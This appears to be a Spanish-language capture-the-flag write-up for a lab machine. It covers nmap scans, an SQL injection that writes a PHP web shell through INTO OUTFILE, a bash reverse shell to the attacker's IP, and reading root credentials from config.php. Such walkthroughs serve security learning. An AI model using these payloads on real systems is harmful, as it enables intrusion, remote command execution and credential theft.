----
- Tags: #sqli
-----
# Resolución

==Esta máquina posee algunos conflictos al seguir el paso a paso, por lo tanto es necesario repetir varias veces en caso de que no funcione la solución==

## Reconocimiento

### NMAP

**Puertos**
```js
Nmap 7.94SVN scan initiated Tue Nov 19 15:56:23 2024 as: nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oN allPorts 10.10.11.116
Nmap scan report for 10.10.11.116
Host is up, received user-set (0.18s latency).
Scanned at 2024-11-19 15:56:23 -03 for 17s
Not shown: 65522 closed tcp ports (reset), 9 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 63
80/tcp   open  http       syn-ack ttl 62
4566/tcp open  kwtc       syn-ack ttl 63
8080/tcp open  http-proxy syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
# Nmap done at Tue Nov 19 15:56:41 2024 -- 1 IP address (1 host up) scanned in 18.02 seconds
```

**Servicios**
```js
Nmap 7.94SVN scan initiated Tue Nov 19 15:58:01 2024 as: nmap -p22,80,4566,8080 -sCV -oN services 10.10.11.116
Nmap scan report for 10.10.11.116
Host is up (0.18s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a (RSA)
|   256 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 (ECDSA)
|_  256 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a (ED25519)
80/tcp   open  http    Apache httpd 2.4.48 ((Debian))
|_http-server-header: Apache/2.4.48 (Debian)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
4566/tcp open  http    nginx
|_http-title: 403 Forbidden
8080/tcp open  http    nginx
|_http-title: 502 Bad Gateway
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Nov 19 15:58:20 2024 -- 1 IP address (1 host up) scanned in 19.00 seconds
```

-----
## Explotación

Encontramos dentro del *puerto 80* un servicio HTTP corriendo con un primer campo de entrada y un segundo que permite seleccionar un país.
Interceptando con ``Burpsuite`` notamos que el campo de "*País*" se puede modificar a diferencia de la web que no se podía ya que daba opciones pre-establecidas, por lo tanto comenzamos a probar métodos.

### SQLI

Ejecutamos una **SQLI** clásica, con eso veremos que no ganamos datos de ningún tipo ya que en la base de datos no se encuentra información de utilidad, por lo tanto intentamos depositar contenido en una ruta para ver si es posible.

- ``' union select 'probando' into outfile "/var/www/html/probando.txt"``

Luego de enviar la petición con los datos anteriores, si nos dirigimos a http://ip-máquina/probando.txt veremos la cadena "*probando*". Al verificar que esto es posible vamos a intentar depositar contenido malicioso con **código PHP** con un archivo con dicha extensión.

```php
Brazil' union select "<?php system($_REQUEST['cmd']); ?>" into outfile "/var/www/html/cmd.php"-- -
```

Si nos dirigimos a http://ip-máquina/cmd.php veremos un **Warning**, esto es buena señal ya que si colocamos ``?cmd=`` al final del URL, haremos referencia al parámetro creado previamente por nosotros en el código malicioso, de esta forma podremos **controlar el comando que deseemos ejecutar** desde ahí por ejemplo ``?cmd=whoami``. En mi caso voy a entablar una **Reverse Shell**.

```bash
http://ip-máquina/cmd.php?cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.13/443 0>&1'
```

Una vez dentro de la máquina si listamos el contenido del directorio ``/var/www/html`` veremos un archivo llamado **``config.php``**, este tendrá consigo las credenciales del usuario root, por lo tanto simplemente nos autenticamos y reclamamos la **flag** en el directorio ``/root``.